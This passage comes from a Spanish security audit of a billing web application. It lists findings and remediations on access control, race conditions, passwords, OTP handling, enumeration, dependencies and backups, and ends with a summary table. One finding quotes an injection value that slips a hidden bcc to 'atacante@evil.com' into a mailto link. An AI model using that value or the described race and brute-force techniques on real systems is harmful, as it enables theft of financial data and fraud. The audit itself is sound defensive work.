add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "no-referrer" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Cache-Control "no-store" always;   # en /api/
```

4. Invalidar sesiones desde el servidor: endpoint `POST /api/auth/logout` que incremente `token_version` (o lista de revocación) y borre la cookie.

---

#### A-04 · Devoluciones y anulaciones sin segregación de funciones: el CAJERO puede emitir notas de crédito

| Campo | Valor |
|---|---|
| Severidad | **Alta** (riesgo de fraude interno) |
| CVSS estimado | **6.5** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` |
| CWE | CWE-269 (gestión inadecuada de privilegios), CWE-863 (autorización incorrecta) |
| OWASP | A01:2021 *Broken Access Control* / A04:2021 *Insecure Design* |
| Ubicación | `backend/src/routes/notas-credito.js:8`, `:59-123`, `:126-154`; `backend/src/routes/facturas.js:8`, `:176-225` |

**Descripción.**

```js
// notas-credito.js:8
router.use(requireAuth, requireRol('ADMIN', 'FACTURADOR', 'CAJERO', 'SUPERVISOR'));
```

El rol **CAJERO** —el de menor privilegio operativo— puede:
- **crear** una nota de crédito (devolución de dinero) sobre cualquier factura con pagos,
- **anular** una nota de crédito,
- **anular** una factura sin pagos.

No hay un segundo aprobador, ni límite de importe, ni revisión del motivo, ni alerta. El flujo es de un solo actor.

**Por qué es alta en facturación.** Este es el patrón clásico de fraude interno: el cajero emite una nota de crédito a favor de un cliente cómplice (o de un cliente real, cobrando después por fuera), o anula una factura para que la deuda desaparezca. La auditoría registra "quién", pero no hay control que lo impida, y la anulación de la nota permite borrar el rastro funcional.

**Impacto.** Pérdida económica directa, descuadre contable, imposibilidad de conciliar caja, y en un escenario real, responsabilidad legal/fiscal.

**Recomendación.**
1. **Separar funciones (maker-checker):** el CAJERO solo registra pagos y consulta; las notas de crédito y anulaciones requieren **ADMIN o SUPERVISOR**, o un flujo de **aprobación por dos personas** (quien solicita ≠ quien aprueba).
2. **Límites por importe y por rol** (p. ej., notas > X requieren SUPERVISOR; > Y, ADMIN).
3. **Estado `PENDIENTE_APROBACION`** en `notas_credito` y en anulaciones de factura, con `aprobado_por` y `fecha_aprobacion`.
4. **Prohibir la anulación de notas** o convertirla en otro documento de reverso aprobado; nunca borrar el efecto contable.
5. **Alertas** de notas de crédito por usuario/día y de anulaciones fuera de horario.

---

#### A-05 · Condición de carrera en notas de crédito: se puede devolver más de lo pagado

| Campo | Valor |
|---|---|
| Severidad | **Alta** (si se explota, impacto económico directo) |
| CVSS estimado | **6.5** `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` |
| CWE | CWE-362 (condición de carrera), CWE-367 (TOCTOU) |
| OWASP | A04:2021 *Insecure Design* |
| Ubicación | `backend/src/routes/notas-credito.js:72-101` |

**Descripción.**
La ruta calcula cuánto se ha pagado y cuánto se ha devuelto **sin bloquear la factura**:

```js
const f = await client.query(
  `SELECT f.factura_id, ..., COALESCE(pg.pagado,0) AS pagado, COALESCE(nc.notas_previas,0) AS notas_previas
   FROM facturas f LEFT JOIN (...) pg ... LEFT JOIN (...) nc ...
   WHERE f.factura_id = $1`, [facturaId]);
// ...
if (valorNum > disponible) throw new HttpError(400, ...);
const ins = await client.query(`INSERT INTO notas_credito ...`);
```

No hay `FOR UPDATE`, ni `SERIALIZABLE`, ni un índice/restricción que impida la suma. Dos peticiones simultáneas leen el mismo `pagado = 100` y `notas_previas = 0`, ambas pasan la validación y ambas insertan 100. Resultado: **200 devueltos sobre 100 pagados**.

El contraste con `pagos.js:65-73` y `mis.js:262-270`, que **sí** usan `FOR UPDATE OF f`, demuestra que el patrón correcto ya se conocía en el proyecto: simplemente no se aplicó aquí.

**Impacto.** Doble (o N) devolución por concurrencia. Explotable por un usuario interno con un script sencillo (dos peticiones en paralelo) o por un atacante con acceso a una cuenta con ese rol. Es difícil de detectar después porque cada nota parece válida por separado.

**Recomendación.**
1. Bloquear la factura al inicio de la transacción:

```sql
SELECT ... FROM facturas f WHERE f.factura_id = $1 FOR UPDATE;
```

   (o `SELECT ... FOR UPDATE OF f` con el `LEFT JOIN`), y **recalcular** `pagado`/`notas_previas` **después** del bloqueo.
2. Alternativa/refuerzo: nivel de aislamiento `SERIALIZABLE` con reintento, o un `CHECK`/trigger que valide `SUM(notas) <= SUM(pagos)` al insertar.
3. Añadir una prueba de concurrencia automatizada (dos transacciones en paralelo) al *suite* e2e.

---

#### A-06 · Política de contraseñas débil y ausencia de MFA para cuentas privilegiadas

| Campo | Valor |
|---|---|
| Severidad | **Alta** |
| CVSS estimado | **7.3** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (con A-01 sin límite efectivo) |
| CWE | CWE-521 (requisitos débiles de contraseña), CWE-287 (autenticación inadecuada) |
| OWASP | A07:2021 |
| Ubicación | `backend/src/utils.js:36-48`, `backend/src/routes/auth.js:144`, `backend/src/routes/usuarios.js:41` |

**Descripción.**

```js
export const MIN_CLAVE = 6;
...
if (clave.length < MIN_CLAVE) throw new HttpError(400, `La contraseña debe tener al menos ${MIN_CLAVE} caracteres`);
```

- Mínimo **6 caracteres**, sin requisitos de complejidad, sin comprobación contra contraseñas filtradas (HIBP), sin lista de las más comunes.
- `bcrypt` con coste **10** (aceptable, pero bajo para 2026; 12 es el mínimo recomendado).
- **No hay MFA** para ADMIN ni para SUPERVISOR, que son las cuentas con capacidad de cambiar datos financieros.
- No hay caducidad ni historial de contraseñas, ni bloqueo por contraseñas comprometidas.
- El ADMIN fija la contraseña de otros usuarios y no hay cambio obligatorio en el primer inicio.

**Impacto.** `admin123`, `123456`, `password` pasan la validación. Combinado con A-01 (fuerza bruta sin límite efectivo) y C-01 (credenciales demo), el resultado es que la autenticación no es una barrera real.

**Recomendación.**
1. Mínimo **12 caracteres** (o frase de paso), y bloqueo de las contraseñas más comunes y de las filtradas (API de HIBP con *k-anonymity*, sin enviar la contraseña completa).
2. `bcrypt` coste **12** (o Argon2id).
3. **MFA (TOTP)** obligatorio para ADMIN y SUPERVISOR, y opcional para el resto; *recovery codes* de un solo uso.
4. Cambio obligatorio en el primer inicio y tras un restablecimiento por administrador.
5. Registro de `password_changed_at` y notificación al usuario.

---

### 5.3 Hallazgos medios

#### M-01 · El modo demo del OTP puede dejar el restablecimiento de contraseña abierto

| Campo | Valor |
|---|---|
| Severidad | **Media** (Alta si se despliega sin `NODE_ENV=production`) |
| CVSS estimado | **8.1** en el peor caso |
| CWE | CWE-489 (código de depuración activo), CWE-532 (registro de información sensible) |
| OWASP | A05:2021 / A07:2021 |
| Ubicación | `backend/src/config.js:101`, `backend/src/middleware/notificar.js:17`, `backend/src/routes/auth.js:244-246` |

**Descripción.**

```js
otpDemo: (process.env.OTP_RETORNO_DEMO || (esProduccion ? 'off' : 'on')) !== 'off',
```

El valor por defecto **depende de `NODE_ENV`**. `docker-compose.yml` lo fija a `production`, pero:
- `npm start` / `node src/index.js` en un servidor sin `NODE_ENV` → `otpDemo = true`;
- cualquier persona que ejecute el backend "como en el README" (modo desarrollo) en una máquina accesible → `otpDemo = true`.

Con `otpDemo = true`, `POST /api/auth/recuperar-solicitar` devuelve el código en la respuesta (`base.demo_otp = codigo`). **Cualquiera que conozca un nombre de usuario puede restablecer su contraseña sin tener acceso al correo ni al teléfono.** Además, `notificar.js` imprime el código en los logs.

**Impacto.** Toma de control de cualquier cuenta de cliente (y, por la vía de M-03, de la cuenta de portal de un cliente). En el peor caso, el "modo demo" se queda activo en producción por un descuido de configuración.

**Recomendación.**
1. Que el modo demo **nunca** pueda activarse con `NODE_ENV=production`, aunque se ponga la variable:

```js
otpDemo: !esProduccion && process.env.OTP_RETORNO_DEMO === 'on',
```

2. No imprimir el código en consola en producción (o imprimir solo un hash/identificador).
3. Integrar un proveedor real (SMTP/SMS) antes de producción y **eliminar** la rama que devuelve `demo_otp`.
4. Añadir una comprobación de arranque que falle si `otpDemo` es verdadero con `NODE_ENV=production`.

---

#### M-02 · Enumeración de cuentas y de clientes

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-203 (discrepancia observable), CWE-204 |
| OWASP | A07:2021 |
| Ubicación | `backend/src/routes/auth.js:48-56,96-99,211-222`, `:122-126` |

**Descripción.** Tres oráculos distintos:
1. **Tiempo de respuesta del login:** se ejecuta `bcrypt.compare` solo si el usuario existe; para un usuario inexistente la respuesta es mucho más rápida. Permite distinguir "existe" de "no existe" midiendo tiempos.
2. **`POST /api/auth/registro`:** responde `409 "Ya existe un cliente con esa identificación"` → confirma que un número de documento/NIT pertenece a un cliente del sistema (dato personal).
3. **`POST /api/auth/recuperar-solicitar`:** si la cuenta existe pero no tiene teléfono/correo, responde un `400` específico ("La cuenta no tiene un teléfono registrado…"). Si no existe, responde el mensaje genérico. Es un oráculo directo de existencia.

**Impacto.** Recolección de usuarios válidos para fuerza bruta dirigida; confirmación de que una persona/empresa es cliente de la entidad (fuga de relación comercial, relevante en facturación).

**Recomendación.**
- Ejecutar un `bcrypt.compare` contra un hash ficticio cuando el usuario no exista (igualar tiempos).
- Unificar mensajes y códigos: mismo cuerpo y mismo `status` para "no existe" y "no tiene contacto".
- En el registro, no revelar duplicados por identificación: responder genéricamente y gestionar el duplicado por un canal autenticado.
- Añadir un pequeño retardo aleatorio y limitar por cuenta.

---

#### M-03 · Cualquier rol interno puede crear la cuenta de portal de un cliente con la contraseña que elija

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-269 / CWE-285 (autorización incorrecta) |
| OWASP | A01:2021 |
| Ubicación | `backend/src/routes/clientes.js:128-153` |

**Descripción.** `POST /api/clientes/:id/cuenta` está disponible para **ADMIN, FACTURADOR, CAJERO y SUPERVISOR**. Crea el usuario del portal con el `username` y `password` que envía el llamante. El CAJERO, por tanto, puede crear la cuenta de un cliente que no la tenga, elegir su contraseña e iniciar sesión como ese cliente (ver sus facturas, pagos, saldo y datos personales). No hay consentimiento ni notificación al cliente.

**Impacto.** Suplantación de cliente por personal de bajo privilegio; acceso a datos personales y financieros; posibilidad de "preparar" una cuenta para un fraude posterior.

**Recomendación.**
- Restringir a **ADMIN** (o a FACTURADOR con aprobación) y registrarlo como evento sensible.
- Generar una contraseña temporal aleatoria, entregarla por canal verificado y **obligar el cambio** en el primer acceso.
- Notificar al cliente la creación de la cuenta.
- Separar "crear cuenta" de "restablecer contraseña".

---

#### M-04 · Bloqueo solo por IP, sin límite por cuenta, y sin *cooldown* de OTP

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-307 |
| OWASP | A07:2021 |
| Ubicación | `backend/src/middleware/rateLimit.js`, `backend/src/routes/auth.js:198-252` |

**Descripción.** Todos los límites son por IP. Un atacante con una botnet (o rotando IPs) no encuentra límite por cuenta. En recuperación, `recuperar-solicitar` no tiene *cooldown* por cuenta/canal: se pueden pedir códigos en bucle (hasta 40/15 min por IP) y **bombardear** el teléfono/correo de una víctima, con coste para la empresa.

**Impacto.** Fuerza bruta distribuida; abuso de SMS/correo; degradación de la reputación del dominio.

**Recomendación.** Contadores por `(IP, usuario)` **y** por usuario; *cooldown* de 60 s por solicitud de OTP; máximo 3 códigos/día por cuenta; invalidar el anterior (ya se hace); CAPTCHA en la solicitud.

---

#### M-05 · Datos de pago sensibles sin enmascarar ni cifrar en reposo, y expuestos por la API

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-311 / CWE-312 (falta de cifrado de datos en reposo) |
| OWASP | A02:2021 |
| Ubicación | `database/init.sql:282-287`, `backend/src/routes/mis.js:104-106`, `backend/src/routes/pagos.js:29-30` |

**Descripción.** Se guarda `numero_cuenta` **completo** (transferencias), `vencimiento_tarjeta` y `titular`, sin cifrado de columna. La API los devuelve **completos** a cualquier rol interno y al cliente:

```js
SELECT ..., pg.banco, pg.titular, pg.tipo_tarjeta, pg.ultimos_digitos_tarjeta,
       pg.vencimiento_tarjeta, pg.numero_cuenta, ...
```

El frontend los enmascara al mostrarlos (`ui.jsx:50`), pero **el dato completo viaja por la red y está en la base en claro**. En un `dump` (C-02), se llevan la cuenta completa.

**Impacto.** Exposición de datos bancarios en una brecha o en logs; incumplimiento de PCI-DSS (los datos de tarjeta se limitan a últimos 4 dígitos, pero el vencimiento y el titular amplían el alcance) y de la Ley 1581 (medidas de seguridad).

**Recomendación.**
- Guardar solo los **últimos 4 dígitos** de la cuenta y una referencia enmascarada; si se necesita el número completo para conciliación, cifrarlo con `pgcrypto`/KMS y restringir su lectura a un rol concreto.
- **Enmascarar en la API** (`····1234`) y no devolver el vencimiento si no es imprescindible.
- Nunca incluir estos campos en logs ni en respuestas de listados.

---

#### M-06 · Desactivar un cliente no revoca su acceso al portal

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-613 (caducidad de sesión insuficiente) |
| OWASP | A01:2021 / A07:2021 |
| Ubicación | `backend/src/routes/clientes.js:115-125`, `backend/src/middleware/auth.js:22-67`, `backend/src/routes/auth.js:80` |

**Descripción.** `PATCH /api/clientes/:id/estado` cambia `clientes.estado` a `INACTIVO` pero **no toca** `usuario_cliente.token_version` ni valida el estado en cada petición. `requireAuth` solo comprueba que la fila exista y que `token_version` coincida; **no** comprueba `clientes.estado` ni `usuario_cliente.estado`. El cliente desactivado sigue usando su token hasta 8 h (o indefinidamente si renueva) y sigue viendo facturas, pagos y saldo.

**Impacto.** Un cliente bloqueado por impago, fraude o baja sigue accediendo a información; el control de "desactivar" no surte efecto real.

**Recomendación.**
- En `requireAuth`, para `tipo === 'cliente'`, consultar también `usuario_cliente.estado` y `clientes.estado` (misma consulta, sin coste extra significativo).
- Al desactivar un cliente, incrementar `usuario_cliente.token_version`.
- Añadir una prueba que verifique que un token emitido antes de la desactivación devuelve 401.

---

#### M-07 · Auditoría insuficiente para forense y sin protección de integridad

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-778 (registro insuficiente), CWE-117 (inyección de logs) |
| OWASP | A09:2021 *Security Logging and Monitoring Failures* |
| Ubicación | `backend/src/middleware/audit.js:19-41`, `database/init.sql:175-184` |

**Descripción.** La auditoría registra usuario, módulo, operación y descripción, pero:
- **no** registra IP, `user-agent`, ni valores antes/después;
- no hay protección de integridad: el usuario de la aplicación (superusuario, C-02/M-08) puede `UPDATE`/`DELETE` la tabla;
- no hay retención ni archivado; crece sin límite;
- los fallos de login registran el usuario, pero no el origen;
- no hay alertas ni monitorización (nadie mira la tabla en tiempo real).

**Impacto.** Ante un incidente (fraude, acceso indebido), la evidencia es incompleta y **manipulable**. Para facturación, esto es un problema legal y de auditoría, no solo técnico.

**Recomendación.** Añadir `ip`, `user_agent`, `datos_antes`/`datos_despues` (JSONB) en operaciones críticas; tabla *append-only* (revocar `UPDATE`/`DELETE` al rol de la app, o trigger que lo impida); retención ≥ 5 años con archivado; exportación a un almacenamiento inmutable (S3 Object Lock) y alertas sobre eventos clave.

---

#### M-08 · La aplicación se conecta como superusuario de PostgreSQL, sin RLS

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-250 (privilegios innecesarios) |
| OWASP | A01:2021 / A05:2021 |
| Ubicación | `docker-compose.yml:5-8,27-29`, `backend/src/db.js:4-11` |

**Descripción.** La conexión usa el mismo usuario que creó la base (`finanx`), que en la imagen oficial es **superusuario**. Cualquier SQL injection futura, o cualquier compromiso del backend, tiene privilegios totales: lectura/escritura de todo, `COPY ... FROM PROGRAM`, creación de roles, etc. No hay *row-level security* (RLS) como segunda línea de defensa para el aislamiento por cliente.

**Impacto.** Amplificación de cualquier fallo futuro; imposibilidad de aplicar mínimo privilegio; un `dump` accidental o malicioso no encuentra barrera.

**Recomendación.** Rol `finanx_app` con `SELECT/INSERT/UPDATE/DELETE` solo sobre las tablas necesarias, sin DDL ni superusuario (ver C-02). Evaluar RLS en `facturas`, `pagos` y `notas_credito` por `cliente_id` como defensa en profundidad.

---

#### M-09 · El frontend no envía cabeceras de seguridad (CSP, HSTS, anti-clickjacking)

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-693 (fallo de mecanismo de protección), CWE-1021 |
| OWASP | A05:2021 |
| Ubicación | `frontend/nginx.conf:1-23`, `frontend/index.html` |

**Descripción.** `helmet()` protege las respuestas **de la API**, pero la SPA la sirve nginx **sin ninguna cabecera**: no hay CSP, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy` ni HSTS. `index.html` no declara CSP por `<meta>`.

**Impacto.** Clickjacking del panel interno (un iframe invisible puede inducir a un ADMIN a crear un usuario o anular una factura), ausencia de defensa en profundidad frente a XSS, fuga de URL en el `Referer` (que puede contener IDs de facturas), y downgrade a HTTP.

**Recomendación.** Añadir el bloque de cabeceras de A-03 en el `server` de nginx (y en el `location /api/`), con `always`. Validar la CSP con `Content-Security-Policy-Report-Only` antes de imponerla.

---

#### M-10 · Inyección de cabeceras en enlaces `mailto:` (correo sin validar ni codificar)

| Campo | Valor |
|---|---|
| Severidad | **Media** (baja explotabilidad, impacto real) |
| CWE | CWE-93 (inyección CRLF) / CWE-74 |
| OWASP | A03:2021 *Injection* |
| Ubicación | `frontend/src/pages/FacturaDetalle.jsx:120`, `frontend/src/pages/Clientes.jsx:80`, `frontend/src/pages/BalanceClientes.jsx:44` |

**Descripción.** El correo del cliente se inserta en un `mailto:` **sin `encodeURIComponent`**:

```jsx
href={`mailto:${data.correo}?subject=...`}
```

El correo se guarda sin validación de formato (autoregistro, `POST`/`PUT` de clientes). Un valor como `victima@example.com?bcc=atacante@evil.com` (o con `%0A`/`%0D`) permite **añadir destinatarios ocultos** al correo que el operador abre desde el panel, exfiltrando el estado financiero del cliente.

**Impacto.** Fuga de datos financieros a un tercero cuando un empleado pulse "enviar por correo"; en el mejor caso, un correo mal formado.

**Recomendación.** Validar el correo con una expresión estricta (y, si es posible, verificación por envío); en el frontend, `encodeURIComponent(correo)` y rechazar `?`, `&`, `#`, CR/LF; construir el `mailto` con `URL`/`URLSearchParams` en lugar de concatenar.

---

#### M-11 · Validación de entrada incompleta: errores 500 y entradas no numéricas

| Campo | Valor |
|---|---|
| Severidad | **Media** (robustez; puede usarse para DoS lógico y para ocultar fallos) |
| CWE | CWE-20 (validación inadecuada), CWE-1284 |
| OWASP | A04:2021 |
| Ubicación | `backend/src/routes/facturas.js:48-56`, `notas-credito.js:62-66`, `pedidos.js:87`, `productos.js:39-41`, `pagos.js:98` |

**Descripción.** Varias rutas no aplican las validaciones que sí existen en otras:
- `POST /api/facturas` no valida `pedidoId` como entero (`idNumerico` no se usa): `"abc"` llega a PostgreSQL y produce un error de tipo → **500**.
- `POST /api/notas-credito` no valida `facturaId` numérico → mismo 500.
- `cantidad` en pedidos acepta `Infinity`/`1e30` (desborda `NUMERIC(12,2)`) → 500; también acepta decimales para productos por unidad.
- `POST /api/productos` no valida `impuesto` en el rango 0-100 (el PUT sí) → 500 por el `CHECK`.
- `POST /api/pagos` valida con `toUpperCase()` pero **inserta el valor original** (`metodoPago`), así que `"tarjeta"` pasa la lista blanca y luego viola el `CHECK` de la base → 500 (inconsistente con `mis.js`, que inserta el normalizado).

**Impacto.** Errores 500 que parecen caídas del sistema, imposibilidad de distinguir un fallo propio de una petición mal formada, ruido en logs, y en el caso de `Infinity`/valores enormes, posible consumo de recursos.

**Recomendación.** Usar `idNumerico` en **todas** las rutas; `Number.isFinite` + cotas para cantidades; validar enums y rangos en POST y PUT; normalizar antes de insertar; y mapear errores de PostgreSQL (`22P02`, `23514`, `23505`) a `400/409` en el manejador global.

---

#### M-12 · Dependencias con vulnerabilidades conocidas y sin gestión continua

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-1104 (componentes de terceros sin mantenimiento), CWE-1395 |
| OWASP | A06:2021 *Vulnerable and Outdated Components* |
| Ubicación | `backend/package-lock.json`, `frontend/package-lock.json` |

**Resultado de `npm audit` (2 nov 2026):**

| Proyecto | Paquete | Severidad | Aviso | CVSS |
|---|---|---|---|---|
| backend | `body-parser` (<1.20.9) | Alta | GHSA-27r3-jxmh-p828 — DoS por bytes finales tras cuerpo comprimido | 7.5 |
| backend | `qs` | Media | GHSA-6pq8-jhm2-2vcw — TypeError no capturado (DoS) | 5.3 |
| backend | `express` (transitivo) | Alta | Vía `body-parser` + `qs` | — |
| backend | `express-rate-limit` (transitivo) | Alta | Vía `express` | — |
| frontend | `follow-redirects` (vía `axios`) | Alta | GHSA-q3jh-wrc6-jgq8, GHSA-8r9p-f939-6h3c, GHSA-mrwp-f3q8-3g9p — filtrado de credenciales en redirecciones | 5.9 |
| frontend | `axios` | Alta | Vía `follow-redirects` | — |
| frontend | `react-router` / `react-router-dom` | Media | GHSA-wrjc-x8rr-h8h6 (*open redirect*), GHSA-337j-9hxr-rhxg | 6.1 |

Totales: backend **3 altas + 1 media**; frontend **2 altas + 2 medias**.

**Impacto.** El `body-parser` es alcanzable desde cualquier petición `POST` (la API usa `express.json()`), por lo que el DoS es explotable sin autenticación. `follow-redirects`/`axios` solo se usa contra el propio backend y `react-router` no navega a URLs externas, así que su impacto práctico es bajo, pero deben corregirse igualmente.

**Recomendación.** `npm audit fix` / actualizar `express` (→ `4.22.x` con `body-parser ≥ 1.20.9`), `qs`, `axios` y `react-router` a versiones corregidas; **Dependabot/Renovate** en el repositorio; `npm audit --audit-level=high` como paso bloqueante de CI; SBOM (CycloneDX) y escaneo de imágenes (Trivy/Grype).

---

#### M-13 · Sin límite global de peticiones, sin límite de tamaño y sin paginación

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-770 (asignación sin límites), CWE-799 |
| OWASP | A04:2021 / A05:2021 |
| Ubicación | `backend/src/index.js:36`, `backend/src/routes/*.js` (`LIMIT 300`), `reportes.js:82-113` |

**Descripción.**
- `express.json()` sin `limit` explícito (por defecto 100 KB, aceptable pero no declarado).
- **No hay `rate limit` global**: solo login, registro y recuperación. Cualquier endpoint autenticado (o el 404) puede martillearse.
- Los listados usan `LIMIT 300` **fijo** (sin `offset`, sin `limit` configurable): el operador no puede paginar y, al mismo tiempo, la API devuelve hasta 300 filas de PII por petición, repetible en bucle.
- `GET /api/reportes/balance-clientes` devuelve **todos** los clientes con datos financieros, sin límite.

**Impacto.** Extracción masiva de datos con una sola cuenta interna comprometida; agotamiento de CPU/memoria/DB con peticiones repetidas; degradación del servicio.

**Recomendación.** `express-rate-limit` global (p. ej. 300 req/min/IP) y más estricto en escritura; `express.json({ limit: '64kb' })`; paginación real (`?limit=&offset=` con máximo 100) y exportación controlada; índices y `EXPLAIN` para las consultas de reportes.

---

#### M-14 · Sin copias de seguridad ni plan de recuperación documentado

| Campo | Valor |
|---|---|
| Severidad | **Media** |
| CWE | CWE-693 (ausencia de mecanismo de recuperación) |
| OWASP | A04:2021 (diseño) |
| Ubicación | `docker-compose.yml:11-13` (volumen único), `README.md` |

**Descripción.** Los datos viven en un volumen Docker (`finanx_pgdata`). No hay servicio de *backup*, ni retención, ni cifrado del respaldo, ni prueba de restauración, ni RPO/RTO definidos. Un `docker compose down -v` (que el propio script `levantar.ps1 --purge` ejecuta) borra todo.

**Impacto.** Pérdida total de la facturación ante un fallo de disco, un `rm -rf`, un ransomware o un error humano. Para una empresa, es la diferencia entre una incidencia y el cierre.

**Recomendación.** `pg_dump` programado (diario) + WAL archiving para PITR, copia cifrada en almacenamiento externo (S3/Backblaze) con retención ≥ 30 días y prueba de restauración mensual documentada; RPO ≤ 24 h y RTO ≤ 4 h como objetivos iniciales; *runbook* de recuperación.

---

### 5.4 Hallazgos bajos (endurecimiento)

| ID | Hallazgo | Ubicación | Recomendación |
|---|---|---|---|
| B-01 | `GET /api/health` revela nombre del servicio y hora; el 404 refleja el método y la ruta solicitados. | `index.js:38,52` | Devolver solo `{ok:true}`; no reflejar la ruta. |
| B-02 | `jwt.verify` sin `algorithms` explícito; sin `iss`/`aud`; expiración fija de 8 h sin *refresh* ni rotación de secreto. | `middleware/auth.js:29`, `config.js:81` | `jwt.verify(token, secret, { algorithms: ['HS256'] })`; añadir `iss`/`aud`; rotación de secreto con `kid`. |
| B-03 | El código Efecty es determinístico (`facturaId` + valor + dígito de control): predecible si se conoce la factura. | `mis.js:122-127` | Añadir un nonce/HMAC con secreto de servidor y caducidad real. |
| B-04 | El autoregistro no verifica correo ni teléfono; `tipoCliente`/`tipoIdentificacion` no se validan contra una lista blanca. | `auth.js:105-177`, `clientes.js:58-78` | Verificación por correo; validar enums con `CHECK` en la base. |
| B-05 | Los `console.error` imprimen el error completo y `notificar.js` imprime el OTP. | `index.js:59`, `notificar.js:17` | *Logger* estructurado con redacción de campos sensibles; nunca loguear OTP. |
| B-06 | Imágenes `postgres:16-alpine`/`node:22-alpine`/`nginx:1.27-alpine` por etiqueta mutable; no hay escaneo de imágenes ni SAST/DAST. | `docker-compose.yml`, `Dockerfile` | Fijar por digest, Trivy/Grype en CI, Semgrep/CodeQL, ZAP contra *staging*. |
| B-07 | Respuestas con PII sin `Cache-Control: no-store`. | `index.js` | Cabecera en `/api/*` (y en nginx). |
| B-08 | El limitador de login es un `Map` en memoria: no sirve con más de una instancia y se pierde al reiniciar. | `rateLimit.js:13` | Redis/`rate-limiter-flexible`. |
| B-09 | Numeración secuencial de facturas (`FAC-000001`) revela volumen de negocio. | `facturas.js:82` | Si es requisito fiscal, mantener; si no, series por año/resolución DIAN. |

---

### 5.5 Falsos positivos descartados (y por qué)

Esta sección documenta lo que **se buscó y no se encontró**, con el razonamiento. Demuestra que la ausencia de un hallazgo es una conclusión, no un olvido.

| Hipótesis | Resultado | Evidencia / razonamiento |
|---|---|---|
| **SQL injection** | **No** | Las 117 interpolaciones revisadas son fragmentos estáticos; todos los valores van como `$n`. El único `LIMIT` interpolado históricamente ya se parametrizó (`auditoria.js:25`). |
| **IDOR en el portal** | **No** | Las 11 rutas `/api/mis-*` filtran por `req.user.clienteId` en el `WHERE`; el `clienteId` sale del token, no del request. Comprobado en `mis.js:47,81,142,267`. |
| **Manipulación de precios/totales** | **No** | `pedidos.js:93-105` lee el precio de `productos` y calcula subtotal/impuesto/total en el servidor; el body solo envía `productoId` y `cantidad`. |
| **XSS** | **No (hoy)** | React escapa por defecto; no hay `dangerouslySetInnerHTML`, `innerHTML` ni `eval`. El riesgo futuro depende de la CSP (A-03/M-09). |
| **CSRF** | **No aplica** | La autenticación es `Authorization: Bearer`, no cookies; el navegador no la envía automáticamente. *Si se migra a cookies (recomendado), habrá que añadir CSRF.* |
| **Sobrepago por concurrencia** | **No** | `pagos.js:65-73` y `mis.js:262-270` usan `FOR UPDATE OF f` y recalculan el saldo dentro de la transacción. |
| **Doble factura del mismo pedido** | **No (bloqueado)** | `uq_factura_activa_por_pedido` (índice único parcial) lo impide en la base; la segunda transacción falla y revierte. |
| **Falsificación de JWT** | **No** | Secreto de 64 caracteres aleatorio, validado al arrancar; `jsonwebtoken` 9 rechaza `alg: none`; `token_version` limita tokens robados tras cambio de contraseña. |
| **Almacenamiento de PAN/CVV** | **No** | Solo se guardan últimos 4 dígitos, tipo, banco y vencimiento; el CVV nunca se persiste (`utils.js:105-110`). |
| **Path traversal / subida de archivos / SSRF** | **No aplica** | No hay subida de archivos, ni rutas de sistema, ni peticiones salientes a URLs del usuario. |
| **Inyección de comandos** | **No** | No se usa `exec`/`spawn` con entrada del usuario. |
| **Mass assignment** | **No** | Las rutas asignan campo por campo; no hay `...req.body` hacia la base. |

> **Nota sobre el IDOR:** es el fallo más común en portales de clientes y aquí está **bien resuelto**; merece mención en la defensa del proyecto.

---

## 6. Tabla resumen de hallazgos

| ID | Severidad | Hallazgo | CWE | OWASP | Ubicación principal |
|---|---|---|---|---|---|
| C-01 | Crítica | Credenciales admin por defecto en cada arranque + demo en la UI | 798/1392 | A05/A07 | `seed.js:37-52`, `Dockerfile:14`, `Login.jsx:143` |
| C-02 | Crítica | PostgreSQL publicado con `finanx`/`finanx` y superusuario | 1188/250 | A05/A01 | `docker-compose.yml:2-18` |
| C-03 | Crítica | Sin TLS y backend publicado en :4000 | 319/311 | A02 | `nginx.conf:1-14`, `docker-compose.yml:53` |
| A-01 | Alta | El bloqueo de login se reinicia con un login válido | 307 | A07 | `rateLimit.js:32-53`, `auth.js:61,89` |
| A-02 | Alta | `X-Forwarded-For` falsificable → bypass de límites | 348/290 | A05/A07 | `index.js:21`, `docker-compose.yml:53` |
| A-03 | Alta | JWT en `localStorage` + SPA sin CSP | 922/1021 | A01/A05 | `auth.jsx:17`, `nginx.conf` |
| A-04 | Alta | Devoluciones/anulaciones sin segregación de funciones | 269/863 | A01/A04 | `notas-credito.js:8,59,126` |
| A-05 | Alta | Carrera en notas de crédito (sin `FOR UPDATE`) | 362/367 | A04 | `notas-credito.js:72-101` |
| A-06 | Alta | Contraseñas débiles (6) y sin MFA para admin | 521/287 | A07 | `utils.js:36-48`, `usuarios.js:41` |
| M-01 | Media | OTP demo activable sin `NODE_ENV`; OTP en logs | 489/532 | A05/A07 | `config.js:101`, `notificar.js:17` |
| M-02 | Media | Enumeración de cuentas y de clientes | 203/204 | A07 | `auth.js:48-56,211-222,122-126` |
| M-03 | Media | Cualquier rol crea la cuenta del cliente con su contraseña | 269/285 | A01 | `clientes.js:128-153` |
| M-04 | Media | Límite solo por IP; sin *cooldown* de OTP | 307 | A07 | `rateLimit.js`, `auth.js:198-252` |
| M-05 | Media | Cuenta bancaria/vencimiento completos y sin cifrar | 311/312 | A02 | `init.sql:282-287`, `mis.js:104` |
